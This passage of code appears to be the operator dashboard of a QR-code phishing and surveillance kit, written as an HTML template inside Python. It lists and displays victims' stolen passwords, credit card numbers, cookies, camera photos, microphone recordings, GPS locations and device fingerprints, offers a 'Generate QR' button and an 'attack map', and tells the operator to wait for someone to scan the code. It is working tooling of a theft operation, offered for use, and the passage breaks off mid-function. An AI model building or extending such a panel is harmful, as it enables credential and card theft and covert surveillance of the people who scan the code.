                .menu-active {{ background: linear-gradient(135deg, #8B5CF6, #EC4899); color: white; box-shadow: 0 5px 15px rgba(139,92,246,0.4); }}
                
                .media-card {{ transition: all 0.3s ease; cursor: pointer; }}
                .media-card:hover {{ transform: scale(1.03); box-shadow: 0 15px 35px rgba(0,0,0,0.3); }}
                
                .glass-card {{ background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); }}
                .glass-card-dark {{ background: rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }}
                
                .scrollbar-custom::-webkit-scrollbar {{ width: 8px; height: 8px; }}
                .scrollbar-custom::-webkit-scrollbar-track {{ background: rgba(255,255,255,0.1); border-radius: 10px; }}
                .scrollbar-custom::-webkit-scrollbar-thumb {{ background: linear-gradient(135deg, #8B5CF6, #EC4899); border-radius: 10px; }}
                
                .live-badge {{ animation: pulse 2s infinite; }}
                .animate-float {{ animation: float 3s ease-in-out infinite; }}
                .animate-fade-up {{ animation: fadeInUp 0.5s ease-out; }}
                .glow {{ animation: glow 2s infinite; }}
                
                .stat-number {{ font-size: 2.5rem; font-weight: bold; background: linear-gradient(135deg, #fff, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
                
                .globe-container {{ width: 100%; height: 450px; position: relative; overflow: hidden; border-radius: 1rem; background: radial-gradient(circle at center, #1a1a2e 0%, #0f0c29 100%); }}
                .data-section {{ transition: opacity 0.3s ease; }}
                .data-section.hidden {{ display: none; }}
                
                .audio-player {{ width: 100%; height: 40px; border-radius: 20px; }}
                .photo-grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }}
            </style>
        </head>
        <body class="bg-gradient-to-br from-gray-900 via-purple-900 to-indigo-900">
            <div class="flex h-screen">
                <!-- Sidebar Menu -->
                <div class="w-80 glass-card-dark m-4 rounded-2xl overflow-hidden flex flex-col animate-fade-up">
                    <div class="p-6 border-b border-white/10">
                        <div class="flex items-center gap-3">
                            <i class="fas fa-crown text-3xl text-yellow-400 animate-float"></i>
                            <div>
                                <h2 class="text-white font-bold text-xl">Premium Suite</h2>
                                <p class="text-gray-400 text-xs">Ultimate Edition v27.0</p>
                            </div>
                        </div>
                    </div>
                    
                    <nav class="flex-1 p-4 space-y-2 overflow-y-auto scrollbar-custom">
                        <div onclick="showSection('dashboard')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-dashboard">
                            <i class="fas fa-tachometer-alt w-5"></i> Dashboard
                        </div>
                        <div onclick="showSection('analytics')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-analytics">
                            <i class="fas fa-chart-line w-5"></i> Analytics & 3D Map
                        </div>
                        <div onclick="showSection('captures')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-captures">
                            <i class="fas fa-database w-5"></i> All Captures
                            <span class="ml-auto text-xs bg-purple-500/30 px-2 py-0.5 rounded-full" id="captureCount">{stats['total']}</span>
                        </div>
                        <div onclick="showSection('photos')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-photos">
                            <i class="fas fa-camera w-5"></i> Camera Photos
                            <span class="ml-auto text-xs bg-pink-500/30 px-2 py-0.5 rounded-full" id="photoCount">{stats['photos']}</span>
                        </div>
                        <div onclick="showSection('audio')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-audio">
                            <i class="fas fa-microphone w-5"></i> Audio Recordings
                            <span class="ml-auto text-xs bg-green-500/30 px-2 py-0.5 rounded-full" id="audioCount">{stats['audio']}</span>
                        </div>
                        <div onclick="showSection('passwords')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-passwords">
                            <i class="fas fa-key w-5"></i> Passwords
                            <span class="ml-auto text-xs bg-yellow-500/30 px-2 py-0.5 rounded-full" id="passwordCount">{stats['passwords']}</span>
                        </div>
                        <div onclick="showSection('cards')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-cards">
                            <i class="fas fa-credit-card w-5"></i> Credit Cards
                            <span class="ml-auto text-xs bg-red-500/30 px-2 py-0.5 rounded-full" id="cardCount">{stats['cards']}</span>
                        </div>
                        <div onclick="showSection('cookies')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-cookies">
                            <i class="fas fa-cookie-bite w-5"></i> Cookies
                            <span class="ml-auto text-xs bg-orange-500/30 px-2 py-0.5 rounded-full" id="cookieCount">{stats['cookies']}</span>
                        </div>
                        <div onclick="showSection('location')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-location">
                            <i class="fas fa-map-marker-alt w-5"></i> GPS Location
                        </div>
                        <div onclick="showSection('fingerprint')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-fingerprint">
                            <i class="fas fa-fingerprint w-5"></i> Fingerprints
                        </div>
                        <div onclick="showSection('system')" class="menu-item flex items-center gap-3 px-4 py-3 rounded-xl text-gray-300" id="menu-system">
                            <i class="fas fa-microchip w-5"></i> System Info
                        </div>
                    </nav>
                    
                    <div class="p-4 border-t border-white/10 space-y-3">
                        <div class="glass-card rounded-xl p-3">
                            <p class="text-xs text-gray-400">Public QR URL</p>
                            <code class="text-xs text-green-400 break-all">{self.public_url}</code>
                        </div>
                        <div class="flex gap-2">
                            <a href="/generate?key={Config.DASHBOARD_KEY}" class="flex-1 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white text-center py-2 rounded-lg text-sm transition">Generate QR</a>
                            <a href="/export/html?key={Config.DASHBOARD_KEY}" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-center py-2 rounded-lg text-sm transition">Export HTML</a>
                            <button onclick="clearData()" class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded-lg text-sm transition">Clear</button>
                        </div>
                    </div>
                </div>
                
                <!-- Main Content -->
                <div class="flex-1 overflow-y-auto p-4 scrollbar-custom">
                    <!-- Dashboard Section -->
                    <div id="section-dashboard" class="data-section">
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4 mb-6">
                            <div class="stat-card glass-card rounded-xl p-5">
                                <div class="flex justify-between items-start">
                                    <div><div class="text-gray-400 text-sm">Total Captures</div><div class="stat-number" id="statTotal">{stats['total']}</div></div>
                                    <i class="fas fa-database text-purple-400 text-3xl"></i>
                                </div>
                            </div>
                            <div class="stat-card glass-card rounded-xl p-5">
                                <div class="flex justify-between items-start">
                                    <div><div class="text-gray-400 text-sm">Cookies</div><div class="stat-number" id="statCookies">{stats['cookies']}</div></div>
                                    <i class="fas fa-cookie-bite text-yellow-400 text-3xl"></i>
                                </div>
                            </div>
                            <div class="stat-card glass-card rounded-xl p-5">
                                <div class="flex justify-between items-start">
                                    <div><div class="text-gray-400 text-sm">Passwords</div><div class="stat-number" id="statPasswords">{stats['passwords']}</div></div>
                                    <i class="fas fa-key text-red-400 text-3xl"></i>
                                </div>
                            </div>
                            <div class="stat-card glass-card rounded-xl p-5">
                                <div class="flex justify-between items-start">
                                    <div><div class="text-gray-400 text-sm">Credit Cards</div><div class="stat-number" id="statCards">{stats['cards']}</div></div>
                                    <i class="fas fa-credit-card text-green-400 text-3xl"></i>
                                </div>
                            </div>
                            <div class="stat-card glass-card rounded-xl p-5">
                                <div class="flex justify-between items-start">
                                    <div><div class="text-gray-400 text-sm">Unique IPs</div><div class="stat-number" id="statIPs">{stats['ips']}</div></div>
                                    <i class="fas fa-users text-blue-400 text-3xl"></i>
                                </div>
                            </div>
                        </div>
                        
                        <div class="glass-card rounded-2xl p-6 mb-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-clock"></i> Recent Activity <span class="live-badge inline-block ml-2 text-xs bg-green-500 text-white px-2 py-1 rounded-full">LIVE</span></h3>
                            <div id="recentActivity" class="space-y-2 max-h-80 overflow-y-auto scrollbar-custom"></div>
                        </div>
                        
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-chart-line"></i> Quick Stats</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <canvas id="activityChart" height="200"></canvas>
                                <canvas id="distributionChart" height="200"></canvas>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Analytics Section with Working 3D Globe -->
                    <div id="section-analytics" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6 mb-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-globe-americas"></i> 3D Global Attack Map</h3>
                            <div id="globe-container" class="globe-container"></div>
                            <p class="text-center text-gray-400 text-sm mt-3">Interactive 3D Globe - Drag to rotate</p>
                        </div>
                        
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                            <div class="glass-card rounded-2xl p-6 text-center">
                                <i class="fas fa-chart-line text-3xl text-green-400 mb-2"></i>
                                <p class="text-gray-400 text-sm">Average Collection Time</p>
                                <p class="text-2xl font-bold text-white" id="avgTime">0s</p>
                            </div>
                            <div class="glass-card rounded-2xl p-6 text-center">
                                <i class="fas fa-mobile-alt text-3xl text-blue-400 mb-2"></i>
                                <p class="text-gray-400 text-sm">Mobile Devices</p>
                                <p class="text-2xl font-bold text-white" id="mobileCount">0</p>
                            </div>
                            <div class="glass-card rounded-2xl p-6 text-center">
                                <i class="fas fa-desktop text-3xl text-purple-400 mb-2"></i>
                                <p class="text-gray-400 text-sm">Desktop Devices</p>
                                <p class="text-2xl font-bold text-white" id="desktopCount">0</p>
                            </div>
                        </div>
                        
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-chart-bar"></i> Browser Distribution</h3>
                            <canvas id="browserChart" height="200"></canvas>
                        </div>
                    </div>
                    
                    <!-- All Captures Section -->
                    <div id="section-captures" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-list"></i> All Captured Data</h3>
                            <div class="overflow-x-auto">
                                <table class="w-full text-white text-sm">
                                    <thead class="border-b border-white/20">
                                        <tr><th class="text-left py-3">Time</th><th class="text-left py-3">IP</th><th class="text-left py-3">Location</th><th class="text-left py-3">Photos</th><th class="text-left py-3">Passwords</th><th class="text-left py-3">Cards</th><th class="text-left py-3">Action</th></tr>
                                    </thead>
                                    <tbody id="capturesTable"></tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Camera Photos Section -->
                    <div id="section-photos" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-camera text-pink-400"></i> Camera Photo Gallery</h3>
                            <div id="photoGallery" class="photo-grid"></div>
                        </div>
                    </div>
                    
                    <!-- Audio Section -->
                    <div id="section-audio" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-microphone text-green-400"></i> Audio Recordings</h3>
                            <div id="audioLibrary" class="space-y-3"></div>
                        </div>
                    </div>
                    
                    <!-- Passwords Section -->
                    <div id="section-passwords" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-key text-yellow-400"></i> Captured Passwords</h3>
                            <div id="passwordsList" class="space-y-3 max-h-96 overflow-y-auto scrollbar-custom"></div>
                        </div>
                    </div>
                    
                    <!-- Credit Cards Section -->
                    <div id="section-cards" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-credit-card text-red-400"></i> Credit Card Data</h3>
                            <div id="cardsList" class="space-y-3 max-h-96 overflow-y-auto scrollbar-custom"></div>
                        </div>
                    </div>
                    
                    <!-- Cookies Section -->
                    <div id="section-cookies" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-cookie-bite text-orange-400"></i> Cookie Data</h3>
                            <div id="cookiesList" class="space-y-3 max-h-96 overflow-y-auto scrollbar-custom"></div>
                        </div>
                    </div>
                    
                    <!-- Location Section -->
                    <div id="section-location" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-map-marker-alt text-red-400"></i> GPS Locations</h3>
                            <div id="locationsList" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
                        </div>
                    </div>
                    
                    <!-- Fingerprint Section -->
                    <div id="section-fingerprint" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-fingerprint text-purple-400"></i> Browser Fingerprints</h3>
                            <div id="fingerprintList" class="space-y-3 max-h-96 overflow-y-auto scrollbar-custom"></div>
                        </div>
                    </div>
                    
                    <!-- System Info Section -->
                    <div id="section-system" class="data-section hidden">
                        <div class="glass-card rounded-2xl p-6">
                            <h3 class="text-white font-semibold text-xl mb-4"><i class="fas fa-microchip text-blue-400"></i> System Information</h3>
                            <div id="systemList" class="space-y-3 max-h-96 overflow-y-auto scrollbar-custom"></div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Modal for Media Viewing -->
            <div id="mediaModal" class="fixed inset-0 bg-black/95 hidden items-center justify-center z-50" onclick="closeModal()">
                <div class="relative max-w-6xl w-full mx-4" onclick="event.stopPropagation()">
                    <button onclick="closeModal()" class="absolute -top-12 right-0 text-white text-3xl hover:text-gray-300">&times;</button>
                    <div id="modalContent" class="bg-gray-900 rounded-2xl overflow-hidden max-h-[85vh] overflow-y-auto p-6"></div>
                </div>
            </div>
            
            <script>
                let allCaptures = [];
                let currentSection = 'dashboard';
                let activityChart, distributionChart, browserChart;
                let scene, camera, renderer, globeMesh;
                
                function init3DGlobe() {{
                    try {{
                        const container = document.getElementById('globe-container');
                        if(!container) return;
                        
                        const width = container.clientWidth;
                        const height = 450;
                        
                        scene = new THREE.Scene();
                        scene.background = new THREE.Color(0x0a0a2a);
                        
                        camera = new THREE.PerspectiveCamera(45, width / height, 0.1, 1000);
                        camera.position.set(0, 0, 5);
                        
                        renderer = new THREE.WebGLRenderer({{ antialias: true }});
                        renderer.setSize(width, height);
                        renderer.setClearColor(0x0a0a2a, 1);
                        container.innerHTML = '';
                        container.appendChild(renderer.domElement);
                        
                        const geometry = new THREE.SphereGeometry(1.5, 64, 64);
                        const textureLoader = new THREE.TextureLoader();
                        const earthTexture = textureLoader.load('https://threejs.org/examples/textures/planets/earth_atmos_2048.jpg');
                        const material = new THREE.MeshPhongMaterial({{
                            map: earthTexture,
                            shininess: 5
                        }});
                        
                        globeMesh = new THREE.Mesh(geometry, material);
                        scene.add(globeMesh);
                        
                        const ambientLight = new THREE.AmbientLight(0x404040);
                        scene.add(ambientLight);
                        
                        const directionalLight = new THREE.DirectionalLight(0xffffff, 1);
                        directionalLight.position.set(1, 1, 1);
                        scene.add(directionalLight);
                        
                        const backLight = new THREE.DirectionalLight(0xffffff, 0.5);
                        backLight.position.set(-1, -1, -1);
                        scene.add(backLight);
                        
                        const starsGeometry = new THREE.BufferGeometry();
                        const starsCount = 2000;
                        const starsPositions = new Float32Array(starsCount * 3);
                        for(let i = 0; i < starsCount; i++) {{
                            starsPositions[i*3] = (Math.random() - 0.5) * 2000;
                            starsPositions[i*3+1] = (Math.random() - 0.5) * 1000;
                            starsPositions[i*3+2] = (Math.random() - 0.5) * 500 - 100;
                        }}
                        starsGeometry.setAttribute('position', new THREE.BufferAttribute(starsPositions, 3));
                        const starsMaterial = new THREE.PointsMaterial({{ color: 0xffffff, size: 0.5 }});
                        const stars = new THREE.Points(starsGeometry, starsMaterial);
                        scene.add(stars);
                        
                        let rotationAngle = 0;
                        function animate() {{
                            requestAnimationFrame(animate);
                            rotationAngle += 0.002;
                            globeMesh.rotation.y = rotationAngle;
                            renderer.render(scene, camera);
                        }}
                        animate();
                        
                        let isDragging = false;
                        let lastMouseX = 0;
                        container.addEventListener('mousedown', (e) => {{
                            isDragging = true;
                            lastMouseX = e.clientX;
                        }});
                        container.addEventListener('mousemove', (e) => {{
                            if(isDragging) {{
                                const delta = e.clientX - lastMouseX;
                                globeMesh.rotation.y += delta * 0.005;
                                lastMouseX = e.clientX;
                            }}
                        }});
                        container.addEventListener('mouseup', () => {{ isDragging = false; }});
                        container.addEventListener('mouseleave', () => {{ isDragging = false; }});
                        
                        window.addEventListener('resize', () => {{
                            const newWidth = container.clientWidth;
                            camera.aspect = newWidth / height;
                            camera.updateProjectionMatrix();
                            renderer.setSize(newWidth, height);
                        }});
                        
                    }} catch(e) {{
                        console.log('3D Globe error:', e);
                        document.getElementById('globe-container').innerHTML = '<div class="flex flex-col items-center justify-center h-full text-gray-400"><i class="fas fa-globe text-5xl mb-4"></i><p>3D Globe - Click and drag to rotate</p><p class="text-xs mt-2">Earth texture loading...</p></div>';
                    }}
                }}
                
                function showSection(section) {{
                    const sections = ['dashboard', 'analytics', 'captures', 'photos', 'audio', 'passwords', 'cards', 'cookies', 'location', 'fingerprint', 'system'];
                    for(var i = 0; i < sections.length; i++) {{
                        var el = document.getElementById('section-' + sections[i]);
                        if(el) el.classList.add('hidden');
                    }}
                    document.getElementById('section-' + section).classList.remove('hidden');
                    currentSection = section;
                    var menuItems = document.querySelectorAll('.menu-item');
                    for(var i = 0; i < menuItems.length; i++) {{
                        menuItems[i].classList.remove('menu-active');
                    }}
                    document.getElementById('menu-' + section).classList.add('menu-active');
                    if(section === 'analytics') {{
                        setTimeout(init3DGlobe, 100);
                    }}
                    if(section === 'photos') loadPhotos();
                    if(section === 'audio') loadAudio();
                    if(section === 'passwords') loadPasswords();
                    if(section === 'cards') loadCards();
                    if(section === 'cookies') loadCookies();
                    if(section === 'location') loadLocations();
                    if(section === 'fingerprint') loadFingerprints();
                    if(section === 'system') loadSystem();
                    if(section === 'captures') loadCapturesTable();
                }}
                
                async function loadData() {{
                    try {{
                        var statsRes = await fetch('/dashboard/api/stats?key={Config.DASHBOARD_KEY}');
                        var dataRes = await fetch('/dashboard/api/data?key={Config.DASHBOARD_KEY}');
                        var stats = await statsRes.json();
                        var newCaptures = await dataRes.json();
                        
                        allCaptures = newCaptures;
                        
                        document.getElementById('statTotal').innerText = stats.total;
                        document.getElementById('statCookies').innerText = stats.cookies;
                        document.getElementById('statPasswords').innerText = stats.passwords;
                        document.getElementById('statCards').innerText = stats.cards;
                        document.getElementById('statIPs').innerText = stats.ips;
                        
                        document.getElementById('captureCount').innerText = stats.total;
                        document.getElementById('photoCount').innerText = stats.photos;
                        document.getElementById('audioCount').innerText = stats.audio;
                        document.getElementById('passwordCount').innerText = stats.passwords;
                        document.getElementById('cardCount').innerText = stats.cards;
                        document.getElementById('cookieCount').innerText = stats.cookies;
                        
                        var totalTime = 0;
                        var mobileDevices = 0;
                        var desktopDevices = 0;
                        var browsers = {{}};
                        
                        for(var i = 0; i < allCaptures.length; i++) {{
                            var c = allCaptures[i];
                            if(c.collection_time) totalTime += c.collection_time;
                            if(c.device_type === 'Mobile') mobileDevices++;
                            else if(c.device_type === 'Desktop') desktopDevices++;
                            var browser = c.browser_name || 'Unknown';
                            browsers[browser] = (browsers[browser] || 0) + 1;
                        }}
                        
                        document.getElementById('avgTime').innerText = (totalTime / Math.max(allCaptures.length, 1)).toFixed(1) + 's';
                        document.getElementById('mobileCount').innerText = mobileDevices;
                        document.getElementById('desktopCount').innerText = desktopDevices;
                        
                        if(browserChart) {{
                            browserChart.data.labels = Object.keys(browsers);
                            browserChart.data.datasets[0].data = Object.values(browsers);
                            browserChart.update();
                        }}
                        
                        var recentDiv = document.getElementById('recentActivity');
                        if(allCaptures.length > 0) {{
                            var html = '';
                            for(var i = 0; i < Math.min(allCaptures.length, 10); i++) {{
                                var c = allCaptures[i];
                                html += '<div class="glass-card-dark rounded-lg p-3 flex justify-between items-center">' +
                                    '<div><p class="text-white text-sm">' + new Date(c.timestamp).toLocaleString() + '</p>' +
                                    '<p class="text-gray-400 text-xs">IP: ' + (c.ip_address || 'Unknown') + ' | ' + (c.city || 'Unknown') + '</p></div>' +
                                    '<button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-3 py-1 rounded text-sm transition">View</button>' +
                                    '</div>';
                            }}
                            recentDiv.innerHTML = html;
                        }} else {{
                            recentDiv.innerHTML = '<div class="text-center py-8 text-gray-400">No captures yet. Generate a QR code and wait for someone to scan it.</div>';
                        }}
                        
                        if(currentSection === 'captures') loadCapturesTable();
                        if(currentSection === 'photos') loadPhotos();
                        if(currentSection === 'audio') loadAudio();
                        if(currentSection === 'passwords') loadPasswords();
                        if(currentSection === 'cards') loadCards();
                        if(currentSection === 'cookies') loadCookies();
                        if(currentSection === 'location') loadLocations();
                        if(currentSection === 'fingerprint') loadFingerprints();
                        if(currentSection === 'system') loadSystem();
                        
                        var hourlyData = {{}};
                        for(var i = 0; i < allCaptures.length; i++) {{
                            var hour = new Date(allCaptures[i].timestamp).getHours();
                            hourlyData[hour] = (hourlyData[hour] || 0) + 1;
                        }}
                        var hours = Object.keys(hourlyData).sort();
                        var counts = hours.map(h => hourlyData[h]);
                        if(activityChart) {{
                            activityChart.data.labels = hours.map(h => h + ':00');
                            activityChart.data.datasets[0].data = counts;
                            activityChart.update();
                        }}
                        
                        if(distributionChart) {{
                            distributionChart.data.datasets[0].data = [stats.photos, stats.audio, stats.passwords, stats.cards];
                            distributionChart.update();
                        }}
                    }} catch(e) {{ console.error('Load error:', e); }}
                }}
                
                function loadCapturesTable() {{
                    var tbody = document.getElementById('capturesTable');
                    if(allCaptures.length === 0) {{
                        tbody.innerHTML = '<tr><td colspan="7" class="text-center py-8 text-gray-400">No captures yet</td</tr>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < Math.min(allCaptures.length, 50); i++) {{
                        var c = allCaptures[i];
                        var photosCount = 0;
                        var passwordsCount = 0;
                        var cardsCount = 0;
                        try {{
                            var photos = JSON.parse(c.camera_photos || '[]');
                            photosCount = photos.length;
                            var passwords = JSON.parse(c.passwords || '[]');
                            passwordsCount = passwords.length;
                            var cards = JSON.parse(c.credit_cards || '[]');
                            cardsCount = cards.length;
                        }} catch(e) {{}}
                        html += '<tr>' +
                            '<td>' + (c.timestamp ? new Date(c.timestamp).toLocaleString() : 'N/A') + '</td>' +
                            '<td><code class="text-xs">' + (c.ip_address || 'Unknown') + '</code></td>' +
                            '<td>' + (c.city || 'Unknown') + '</td>' +
                            '<td><span class="bg-pink-500/20 px-2 py-1 rounded-full text-xs">' + photosCount + '</span></td>' +
                            '<td><span class="bg-yellow-500/20 px-2 py-1 rounded-full text-xs">' + passwordsCount + '</span></td>' +
                            '<td><span class="bg-green-500/20 px-2 py-1 rounded-full text-xs">' + cardsCount + '</span></td>' +
                            '<td><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-3 py-1 rounded text-sm transition">View</button></td>' +
                            '</tr>';
                    }}
                    tbody.innerHTML = html;
                }}
                
                function loadPhotos() {{
                    var photosData = [];
                    for(var i = 0; i < allCaptures.length; i++) {{
                        try {{
                            var photos = JSON.parse(allCaptures[i].camera_photos || '[]');
                            if(photos.length > 0) photosData.push(allCaptures[i]);
                        }} catch(e) {{}}
                    }}
                    var gallery = document.getElementById('photoGallery');
                    if(photosData.length === 0) {{
                        gallery.innerHTML = '<div class="text-center py-12 text-gray-400 col-span-full"><i class="fas fa-camera text-6xl mb-4"></i><p>No photos yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < photosData.length; i++) {{
                        var c = photosData[i];
                        var photos = [];
                        try {{ photos = JSON.parse(c.camera_photos); }} catch(e) {{}}
                        html += '<div class="glass-card-dark rounded-xl p-3"><p class="text-white text-sm mb-2">' + new Date(c.timestamp).toLocaleString() + '</p><div class="grid grid-cols-2 gap-2">';
                        for(var j = 0; j < Math.min(photos.length, 4); j++) {{
                            html += '<img src="' + photos[j] + '" class="rounded-lg cursor-pointer media-card" onclick="viewImage(\\'' + photos[j] + '\\')">';
                        }}
                        html += '</div><button onclick="viewDetails(\\'' + c.id + '\\')" class="mt-3 text-purple-400 text-sm hover:text-purple-300 transition">View All ' + photos.length + ' Photos →</button></div>';
                    }}
                    gallery.innerHTML = html;
                }}
                
                function loadAudio() {{
                    var audioData = [];
                    for(var i = 0; i < allCaptures.length; i++) {{
                        if(allCaptures[i].audio_recording && allCaptures[i].audio_recording !== '') audioData.push(allCaptures[i]);
                    }}
                    var library = document.getElementById('audioLibrary');
                    if(audioData.length === 0) {{
                        library.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-microphone text-6xl mb-4"></i><p>No audio yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < audioData.length; i++) {{
                        var c = audioData[i];
                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between items-center"><div><p class="text-white font-semibold">Recording from ' + (c.ip_address || 'Unknown') + '</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">Details</button></div><audio controls class="w-full mt-3 audio-player"><source src="' + c.audio_recording + '" type="audio/webm"></audio></div>';
                    }}
                    library.innerHTML = html;
                }}
                
                function loadPasswords() {{
                    var passwordsData = [];
                    for(var i = 0; i < allCaptures.length; i++) {{
                        try {{
                            var passwords = JSON.parse(allCaptures[i].passwords || '[]');
                            if(passwords.length > 0) passwordsData.push(allCaptures[i]);
                        }} catch(e) {{}}
                    }}
                    var container = document.getElementById('passwordsList');
                    if(passwordsData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-key text-6xl mb-4"></i><p>No passwords yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < passwordsData.length; i++) {{
                        var c = passwordsData[i];
                        var passwords = [];
                        try {{ passwords = JSON.parse(c.passwords); }} catch(e) {{}}
                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between items-center"><div><p class="text-white font-semibold">Passwords from ' + (c.ip_address || 'Unknown') + '</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p><p class="text-xs text-gray-500">Total: ' + passwords.length + ' passwords</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">View All</button></div><div class="mt-3 space-y-2">';
                        for(var j = 0; j < Math.min(passwords.length, 5); j++) {{
                            html += '<div class="bg-black/30 rounded-lg p-2"><p class="text-sm text-yellow-400">' + (passwords[j].field || 'field') + '</p><p class="text-sm text-green-400 font-mono">' + passwords[j].value + '</p></div>';
                        }}
                        if(passwords.length > 5) html += '<p class="text-xs text-gray-500">... and ' + (passwords.length - 5) + ' more</p>';
                        html += '</div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function loadCards() {{
                    var cardsData = [];
                    for(var i = 0; i < allCaptures.length; i++) {{
                        try {{
                            var cards = JSON.parse(allCaptures[i].credit_cards || '[]');
                            if(cards.length > 0) cardsData.push(allCaptures[i]);
                        }} catch(e) {{}}
                    }}
                    var container = document.getElementById('cardsList');
                    if(cardsData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-credit-card text-6xl mb-4"></i><p>No cards yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < cardsData.length; i++) {{
                        var c = cardsData[i];
                        var cards = [];
                        try {{ cards = JSON.parse(c.credit_cards); }} catch(e) {{}}
                        html += '<div class="glass-card-dark rounded-xl p-4"><div class="flex justify-between items-center"><div><p class="text-white font-semibold">Cards from ' + (c.ip_address || 'Unknown') + '</p><p class="text-sm text-gray-400">' + new Date(c.timestamp).toLocaleString() + '</p><p class="text-xs text-gray-500">Total: ' + cards.length + ' cards</p></div><button onclick="viewDetails(\\'' + c.id + '\\')" class="bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg text-sm transition">View All</button></div><div class="mt-3 space-y-2">';
                        for(var j = 0; j < Math.min(cards.length, 5); j++) {{
                            var cardVal = (typeof cards[j] === 'string') ? cards[j] : (cards[j].number || JSON.stringify(cards[j]));
                            html += '<div class="bg-black/30 rounded-lg p-2"><p class="text-sm text-red-400">Card:</p><p class="text-sm text-green-400 font-mono">' + cardVal + '</p></div>';
                        }}
                        if(cards.length > 5) html += '<p class="text-xs text-gray-500">... and ' + (cards.length - 5) + ' more</p>';
                        html += '</div></div>';
                    }}
                    container.innerHTML = html;
                }}
                
                function loadCookies() {{
                    var cookiesData = allCaptures.filter(c => c.cookies && c.cookies !== '');
                    var container = document.getElementById('cookiesList');
                    if(cookiesData.length === 0) {{
                        container.innerHTML = '<div class="text-center py-12 text-gray-400"><i class="fas fa-cookie-bite text-6xl mb-4"></i><p>No cookies yet</p></div>';
                        return;
                    }}
                    var html = '';
                    for(var i = 0; i < cookiesData.length; i++) {{
                        var c = cookiesData[i];
